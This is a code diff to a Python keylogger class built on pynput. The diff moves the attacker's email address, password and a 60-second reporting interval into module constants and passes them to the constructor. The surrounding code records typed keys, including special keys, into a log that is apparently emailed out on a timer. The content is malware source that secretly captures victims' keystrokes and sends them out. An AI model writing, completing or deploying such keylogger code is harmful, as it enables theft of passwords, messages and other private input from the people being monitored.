@@ -3,21 +3,23 @@ from pynput.keyboard import Key, Controller, Listener
 # from datetime import datetime
 
 
+EMAIL_ADDRESS = "YOUR_EMAIL"
+EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+SEND_REPORT_EVERY = 60  # as in seconds
+
+
 class Keylogger:
-    EMAIL_ADDRESS = "YOUR_EMAIL"
-    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-    SEND_REPORT_EVERY = 60  # as in seconds
     ks = {
         Key.space: " ",
         Key.enter: "[ENTER]\n",
         Key.tab: "[TAB]",
         Key.backspace: "[BACKSPACE]"}
 
-    def __init__(self, time_interval):
+    def __init__(self, email, password, time_interval):
         self.interval = time_interval
         self.log = ""
-        self.email = Keylogger.EMAIL_ADDRESS
-        self.password = Keylogger.EMAIL_PASSWORD
+        self.email = email
+        self.password = password
 
     def update_log(self, str):
         self.log += str
@@ -39,7 +41,7 @@ class Keylogger:
 
 
 def main():
-    kl = Keylogger(60)
+    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY)
     kl.start()
 
 
